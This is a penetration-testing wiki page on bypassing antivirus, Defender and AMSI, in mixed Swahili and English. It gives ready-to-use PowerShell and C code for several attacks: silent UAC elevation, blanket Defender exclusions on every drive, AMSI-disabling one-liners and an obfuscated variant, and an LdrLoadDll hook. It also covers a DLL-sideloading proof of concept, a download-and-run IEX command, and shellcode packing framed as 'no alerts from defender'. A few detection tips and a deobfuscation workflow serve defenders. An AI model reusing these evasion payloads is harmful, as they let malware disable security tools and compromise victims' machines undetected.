# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Kuzima Defender

- [defendnot](https://github.com/es3n1n/defendnot): Zana ya kuzima Windows Defender ili isifanye kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Zana ya kuzima Windows Defender kwa kudanganya AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Uvutio wa UAC wa mtindo wa installer kabla ya kuingilia Defender

Public loaders masquerading as game cheats frequently ship as unsigned Node.js/Nexe installers that first **ask the user for elevation** and only then neuter Defender. Mtiririko ni rahisi:

1. Chunguza muktadha wa kiutawala kwa kutumia `net session`. Amri inafanikiwa tu wakati muitoaji ana haki za admin, hivyo kushindwa kunaonyesha loader inakimbia kama mtumiaji wa kawaida.
2. Mara moja itajirusha tena kwa kutumia vitenzi `RunAs` ili kusababisha ombi la ridhaa la UAC lililotarajiwa huku ikihakikisha mstari wa amri wa awali unabaki.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Waathirika tayari wanaamini wameweka programu “cracked”, hivyo ombi la uthibitisho kwa kawaida hukubaliwa, ikiwapa malware haki zinazohitajika kubadilisha sera za Defender.

### Msamaha ya jumla ya `MpPreference` kwa kila herufi ya diski

Mara tu imepandishwa hadhi, mnyororo wa GachiLoader-style huongeza maeneo ya giza ya Defender badala ya kuzima huduma kabisa. The loader kwanza huua GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) kisha hutuma **msamaha mapana sana** ili kila profaili ya mtumiaji, saraka ya mfumo, na diski inayoweza kuondolewa isiweze kuchunguzwa:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Uchunguzi muhimu:

- Lupu inapitisha kila filesystem iliyopangwa (D:\, E:\, USB sticks, n.k.) hivyo **vifurushi vyovyote vitakavyowekwa baadaye mahali popote kwenye diski vitapuuzwa**.
- Kiwekezo cha .sys cha kuondolewa kinatazamiwa mbele—washambuliaji wanahifadhi chaguo la kuteka nafasi ya kupakia drivers zisizotiwa sahihi baadaye bila kuathiri Defender tena.
- Mabadiliko yote yanaingia chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, na kuruhusu hatua za baadaye kuthibitisha kwamba exclusions zinaendelea au kuziendeleza bila kuzindua tena UAC.

Kwa sababu hakuna huduma ya Defender iliyofungwa, ukaguzi wa afya wa kawaida unaendelea kuripoti “antivirus active” ingawa ukaguzi wa wakati-halisi hauwahi kugusa njia hizo.

## **AV Evasion Methodology**

Kwa sasa, AVs zinatumia mbinu tofauti za kukagua ikiwa faili ni hatari au la, static detection, dynamic analysis, na kwa EDR za hali ya juu zaidi, behavioural analysis.

### **Static detection**

Static detection inafikiwa kwa kubaini strings zinazojulikana kuwa hatari au mfululizo wa bytes ndani ya binary au script, na pia kwa kutoa taarifa kutoka kwa faili yenyewe (km. file description, company name, digital signatures, icon, checksum, n.k.). Hii ina maana kwamba kutumia zana za umma zinazojulikana kunaweza kukufanya ugundulike kwa urahisi zaidi, kwani huenda tayari zimechanganuliwa na kuorodheshwa kama hatari. Kuna njia kadhaa za kuepuka aina hii ya utambuzi:

- **Encryption**

Ikiwa uta-encrypt binary, hakuna njia kwa AV kugundua programu yako, lakini utahitaji aina fulani ya loader ili ku-decrypt na kuendesha programu hiyo huko memory.

- **Obfuscation**

Wakati mwingine yote unayohitaji ni kubadilisha baadhi ya strings kwenye binary au script ili ipite AV, lakini hii inaweza kuwa kazi inayochukua muda kulingana na unachojaribu kuficha.

- **Custom tooling**

Ikiwa utaunda zana zako mwenyewe, hautakuwa na signatures mbaya zinazojulikana, lakini hili linachukua muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kukagua dhidi ya Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kwa msingi, inagawa faili katika vipande vingi kisha inaagiza Defender kuskaza kila kipande kwa mfululizo; kwa njia hii, inaweza kukuambia hasa ni strings au bytes gani zilizoorodheshwa ndani ya binary yako.

Napendekeza sana uangalie hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion ya vitendo.

### **Dynamic analysis**

Dynamic analysis ni pale AV inapoendesha binary yako ndani ya sandbox na kuangalia shughuli hatarishi (km. kujaribu ku-decrypt na kusoma nywila za browser, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo unaweza kufanya kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi imefanyiwa, inaweza kuwa njia nzuri ya kuipita dynamic analysis ya AV. AV zina muda mfupi sana wa kukagua faili ili zisivurugu mtiririko wa kazi wa mtumiaji, hivyo kutumia sleep ndefu kunaweza kuvuruga uchunguzi wa binaries. Tatizo ni kwamba sandbox nyingi za AV zinaweza kuruka sleeping hilo kulingana na jinsi limefanyiwa.
- **Checking machine's resources** Kwa kawaida Sandboxes zina rasilimali chache (km. < 2GB RAM), vinginevyo zingeweza kupunguza kasi ya mashine ya mtumiaji. Unaweza kuwa mbunifu hapa, kwa mfano kwa kukagua joto la CPU au hata kasi za fan; si kila kipengele kitawekwa katika sandbox.
- **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imejiunga na domain ya "contoso.local", unaweza kukagua domain ya kompyuta kuona kama inalingana na ile uliyobainisha; ikiwa haifanyi, unaweza kufanya programu yako itoke.

Inajitokeza kuwa computername ya Sandbox ya Microsoft Defender ni HAL9TH, hivyo, unaweza kukagua jina la kompyuta katika malware yako kabla ya kuchomwa; ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya sandbox ya defender, kwa hivyo unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Baadhi ya vidokezo vingine nzuri kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kuhusu kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali katika chapisho hili, **public tools** hatimaye **zitatambuliwa**, hivyo unapaswa kujiuliza jambo:

Kwa mfano, ikiwa unataka kudump LSASS, **je, kwa kweli unahitaji kutumia mimikatz**? Au unaweza kutumia mradi mwingine usiojulikana sana ambao pia undump LSASS?

Jibu sahihi labda ni hili la mwisho. Kuchukua mimikatz kama mfano, ni moja ya, kama sio kipande cha programu kinachotambulika zaidi na AVs na EDRs; mradi yenyewe ni baridi, lakini pia ni taabu kuufanyia kazi ili kuchukua hatua dhidi ya AVs, kwa hivyo tafuta mbadala kwa kile unachotaka kufanikisha.

> [!TIP]
> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha **uzima automatic sample submission** katika defender, na tafadhali, kwa uzito, **DO NOT UPLOAD TO VIRUSTOTAL** ikiwa lengo lako ni kufikia evasion kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inatambuliwa na AV fulani, sanifu yake kwenye VM, jaribu kuzima automatic sample submission, na itest huko hadi utakapofurahi na matokeo.

## EXEs vs DLLs

Pindi inapowezekana, kila mara **wipa kipaumbele kutumia DLLs kwa ajili ya evasion**, kwa uzoefu wangu, faili za DLL mara nyingi **haziwezi kuonekana kwa urahisi** na kuchanganuliwa, hivyo ni mbinu rahisi ya kuepuka utambuzi katika baadhi ya kesi (ikiwa payload yako ina njia ya kuendeshwa kama DLL, bila shaka).

Kama tunaona katika picha hii, DLL Payload kutoka Havoc ina kiwango cha utambuzi cha 4/26 kwenye antiscan.me, wakati EXE payload ina kiwango cha 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha baadhi ya mbinu unaweza kutumia na faili za DLL ili uwe wa siri zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** inatumia muundo wa utafutaji wa DLL unaotumika na loader kwa kuweka programu ya mwathiriwa na payload(za) hasidi karibu pamoja.

Unaweza kuangalia programu zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itaonyesha orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana u**explore DLL Hijackable/Sideloadable programs yourself**, mbinu hii ni ya kiminyanga ikiwa itafanywa vizuri, lakini ikiwa utatumia programu maarufu za DLL Sideloadable, unaweza kukamatwa kwa urahisi.

Kwa kuweka tu malicious DLL yenye jina ambalo programu inatarajia kupakia, haitapakua payload yako, kwani programu inatarajia baadhi ya kazi maalum ndani ya DLL hiyo; ili kurekebisha tatizo hili, tutatumia mbinu nyingine iitwayo **DLL Proxying/Forwarding**.

**DLL Proxying** inapeleka miito ambayo programu inaitoa kutoka kwa proxy (na malicious) DLL hadi kwa DLL ya asili, hivyo kuhifadhi utendaji wa programu na kuwa na uwezo wa kushughulikia utekelezaji wa payload yako.

Nitakuwa nikitumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/).

Hizi ndizo hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupa faili 2: templeti ya msimbo wa chanzo wa DLL, na DLL ya asili iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Haya ni matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zote shellcode yetu (encoded with [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina 0/26 Detection rate katika [antiscan.me](https://antiscan.me)! Ningeyaita hiyo mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza sana utazame [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu tulichojadili kwa undani.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuonyesha kwenye code, entry ya export ina ASCII string ya aina `TargetDll.TargetFunc`. Wakati caller anapotatua export, Windows loader itafanya:

- Kupakia `TargetDll` ikiwa bado haijapakiwa
- Kutatua `TargetFunc` kutoka kwake

Tabia kuu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, inatolewa kutoka kwa protected KnownDLLs namespace (mfano: ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` si KnownDLL, mpangilio wa kawaida wa DLL search order utatumika, pamoja na directory ya module inayofanya forward resolution.

Hii inaruhusu primitive isiyo ya moja kwa moja ya sideloading: tafuta signed DLL inayotoa function iliyoforward kwenda jina la module ambalo si KnownDLL, kisha weka pamoja signed DLL hiyo na attacker-controlled DLL iliyopewa jina hasa kama module ya target iliyoforward. Wakati forwarded export inapoitwa, loader itatatua forward na kupakia DLL yako kutoka directory ile ile, ikitekeleza DllMain yako.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si KnownDLL, kwa hivyo inatatuliwa kupitia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliosainiwa kwenye folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` yenye madhara katika folda ile ile. `DllMain` ya msingi inatosha kupata utekelezaji wa msimbo; huna haja ya kutekeleza forwarded function ili kusababisha `DllMain` iitwe.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Chochea forward kwa LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) inapakia side-by-side `keyiso.dll` (signed)
- Wakati ikitatua `KeyIsoSetAuditingInterface`, loader inafuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader inapakia `NCRYPTPROV.dll` kutoka `C:\test` na inatekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata kosa la "missing API" tu baada ya `DllMain` imekwisha kukimbia

Hunting tips:
- Lenga kwenye forwarded exports ambapo module lengwa si KnownDLL. KnownDLLs zimetajwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Angalia orodha ya forwarder ya Windows 11 kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt

Mawazo ya utambuzi/kinga:
- Fuatilia LOLBins (e.g., rundll32.exe) inapakia signed DLLs kutoka njia zisizo za system, ikifuatiwa na kupakia non-KnownDLLs zenye jina la msingi sawa kutoka saraka hiyo
- Toa tahadhari kwa mnyororo wa mchakato/moduli kama: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` chini ya njia zinazoweza kuandikwa na mtumiaji
- Lazimisha sera za uadilifu wa code (WDAC/AppLocker) na zuia write+execute katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni payload toolkit ya kuzunguka EDRs kwa kutumia suspended processes, direct syscalls, na alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya kificho.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Kukwepa ni mchezo wa paka na panya; kile kinachofanya kazi leo kinaweza kugunduliwa kesho, hivyo usitegemee zana moja tu — iwezekanavyo, jaribu kuunganisha mbinu mbalimbali za kukwepa.

## AMSI (Anti-Malware Scan Interface)

AMSI ilianzishwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Awali, AV zilikuwa zina uwezo wa kuchambua tu **files on disk**, hivyo ikiwa ungefanya kwa namna fulani kuendesha payloads **directly in-memory**, AV haingeweza kufanya chochote kuzuia, kwa sababu haikuwa na uonekano wa kutosha.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (kuinua hadhi ya EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi ya kuingiliana, na tathmini ya msimbo kwa wakati halisi)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Inaruhusu suluhisho za antivirus kuchunguza tabia za script kwa kufichua yaliyomo ya script katika fomu ambayo haijasimbwa wala haijaobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Tambua jinsi inavyoweka kabla `amsi:` na kisha njia ya executable kutoka ambayo script ilikimbia, katika kesi hii, powershell.exe

Hatukuweka faili lolote kwenye disk, lakini bado tuliwakamika kwenye memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, C# code inakimbia kupitia AMSI pia. Hii inaathiri hata `Assembly.Load(byte[])` kwa kutumia execution ya in-memory. Ndiyo sababu inashauriwa kutumia toleo la chini la .NET (kama 4.7.2 au chini) kwa execution ya in-memory ikiwa unataka kukwepa AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

Hata hivyo, AMSI ina uwezo wa kuondoa obfuscation ya script hata kama ina tabaka nyingi, hivyo obfuscation inaweza kuwa chaguo duni kulingana na jinsi inavyofanywa. Hii inafanya isiwe rahisi kukwepa. Ingawa, wakati mwingine, zote unazohitaji ni kubadilisha majina ya vigezo chache na utafanikiwa, hivyo inategemea ni kiasi gani kitu kilichotambuliwa.

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichukua laini moja tu ya msimbo wa powershell ili kufanya AMSI isitumike kwa mchakato wa powershell wa sasa. Laini hii, bila shaka, ilitambulishwa na AMSI yenyewe, hivyo marekebisho madogo yanahitajika ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyoichukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka, hii huenda ikatambuliwa mara chapisho hili litakapotoka, hivyo usichapishe code ikiwa unakusudia kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kupata anwani ya "AmsiScanBuffer" function katika `amsi.dll` (inayehusika na kuchambua input iliyotolewa na mtumiaji) na kuibandika juu kwa maelekezo ya kurudisha code ya E_INVALIDARG; kwa njia hii, matokeo ya skani halisi yatarejesha 0, ambayo hueleweka kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina.

Kuna mbinu nyingi nyingine pia zinazotumika kupita AMSI kwa powershell; angalia [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuhusu hizo.

### Kuzuia AMSI kwa kuzuia upakiaji wa `amsi.dll` (LdrLoadDll hook)

AMSI inaanzishwa tu baada ya `amsi.dll` kupakiwa ndani ya process inayotumika. Njia thabiti, isiyotekelezwa kwa lugha maalum ya kuipita ni kuweka user‑mode hook kwenye `ntdll!LdrLoadDll` ambayo inarudisha kosa wakati module iliyohitajika ni `amsi.dll`. Kwa matokeo, AMSI haisi pakuliwa na hakuna skani zitakazofanyika kwa process hiyo.

Muhtasari wa utekelezaji (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Inafanya kazi ndani ya PowerShell, WScript/CScript na loaders maalum pia (chochote ambacho vingehitaji kupakia AMSI).
- Itumike pamoja na kuingiza script kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka athari ndefu za mstari wa amri.
- Imeonekana ikitumika na loaders zinazoendeshwa kupitia LOLBins (mfano, `regsvr32` ikiita `DllRegisterServer`).

Chombo hiki [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) pia kinatengeneza script za bypass AMSI.

**Toa saini iliyogunduliwa**

Unaweza kutumia chombo kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyogunduliwa kutoka kwenye kumbukumbu ya mchakato wa sasa. Chombo hiki kinafanya kazi kwa kuchambua kumbukumbu ya mchakato wa sasa kutafuta saini ya AMSI kisha kuandika juu yake kwa NOP instructions, kwa vitendo kuiondoa kwenye kumbukumbu.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya AV/EDR products zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell toleo 2**
Ikiwa utatumia PowerShell toleo 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## Uandishi wa PS

PowerShell logging ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zinazoendeshwa kwenye mfumo. Hii inaweza kuwa muhimu kwa ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kuepuka kugunduliwa**.

Ili kuepuka PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuchunguzwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha powershell bila ulinzi (hii ndicho `powerpick` kutoka Cobal Strike inatumia).


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation zinategemea kusimbua data, jambo ambalo litaongeza entropy ya binary na kufanya iwe rahisi kwa AVs na EDRs kuibaini. Kuwa mwangalifu na hili na pengine tumia kusimbua tu sehemu maalum za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wakati wa kuchambua malware inayotumia ConfuserEx 2 (au commercial forks) ni kawaida kukutana na tabaka kadhaa za ulinzi zitakazozuia decompilers na sandboxes. Mtiririko wa kazi hapa chini kwa uaminifu **urejesha near–original IL** ambayo baadaye inaweza kudecompilewa hadi C# kwa zana kama dnSpy au ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`). Hii pia inaboresha PE checksum hivyo mabadiliko yoyote yatafanya binary crash. Tumia **AntiTamperKiller** kutambua encrypted metadata tables, kurejesha XOR keys na kuandika upya assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output inajumuisha vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambavyo vinaweza kuwa muhimu wakati wa kujenga unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – wape faili *clean* **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot itafuta control-flow flattening, itarejesha namespaces, classes na variable names za asili na ku-decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) ili kuvunja zaidi decompilation. Ondoa hizo kwa **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii utapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya wrapper functions zisizoeleweka (`Class8.smethod_10`, …).

4.  Manual clean-up – endesha binary inayotokana chini ya dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kutambua payload halisi. Mara nyingi malware huihifadhi kama TLV-encoded byte array iliyoanzishwa ndani ya `<Module>.byte_0`.

Mnyororo uliotajwa uurejesha mtiririko wa utekelezaji **bila** kuhitaji kuendesha sampuli hasidi – muhimu wakati unafanya kazi kwenye offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` ambayo inaweza kutumika kama IOC ili kutriaji sampuli kiotomati.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya suite ya LLVM inayoweza kuongeza usalama wa programu kupitia code obfuscation na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia `C++11/14` ili kuzalisha, wakati wa compile, obfuscated code bila kutumia zana za nje na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Inaongeza tabaka la obfuscated operations zinazozalishwa na C++ template metaprogramming framework ambayo itafanya kazi ya mtu anayetaka crack programu kuwa ngumu zaidi kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza ku-obfuscate aina mbalimbali za pe files ikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni metamorphic code engine rahisi kwa arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa LLVM-supported languages ikitumia ROP (return-oriented programming). ROPfuscator inafanya obfuscation ya programu kwenye assembly code level kwa kubadilisha maagizo ya kawaida kuwa ROP chains, ikizuia mtiririko wetu wa kawaida wa control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter imeandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor ina uwezo wa kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzizusha

## SmartScreen & MoTW

Labda umewahi kuona skrini hii unapopakua baadhi ya executables kutoka mtandao na kuzitekeleza.

Microsoft Defender SmartScreen ni mwiko wa usalama uliokusudiwa kulinda mtumiaji wa mwisho dhidi ya kuendesha applications ambazo zinaweza kuwa za hatari.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

